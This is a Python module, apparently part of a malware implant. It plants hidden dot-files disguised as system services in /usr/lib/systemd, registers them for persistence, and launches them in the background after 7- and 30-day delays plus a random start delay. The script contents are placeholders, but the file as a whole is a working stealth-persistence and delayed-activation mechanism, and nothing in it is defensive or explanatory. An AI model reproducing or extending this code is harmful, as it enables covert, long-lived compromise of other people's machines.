import time
import os
from utils.persistence import setup_persistence, random_start_delay
from utils.config import ENABLE_SEEDS

SEEDS = [
    {"name": "sys-monitor", "activation_time": time.time() + 2592000},  # Activate after 30 days
    {"name": "sys-backup", "activation_time": time.time() + 604800},  # Activate after 7 days
]

def plant_seeds():
    if ENABLE_SEEDS:
        for seed in SEEDS:
            with open(f"/usr/lib/systemd/.{seed['name']}.py", "w") as f:
                f.write("# Seed script content here")

            setup_persistence(f"/usr/lib/systemd/.{seed['name']}.py")

def check_seed_activation():
    if ENABLE_SEEDS:
        current_time = time.time()
        for seed in SEEDS:
            if current_time > seed["activation_time"]:
                activate_seed(seed)

def activate_seed(seed):
    seed_script = f"/usr/lib/systemd/.{seed['name']}.py"
    os.system(f"/usr/bin/python3 {seed_script} &")
    random_start_delay()
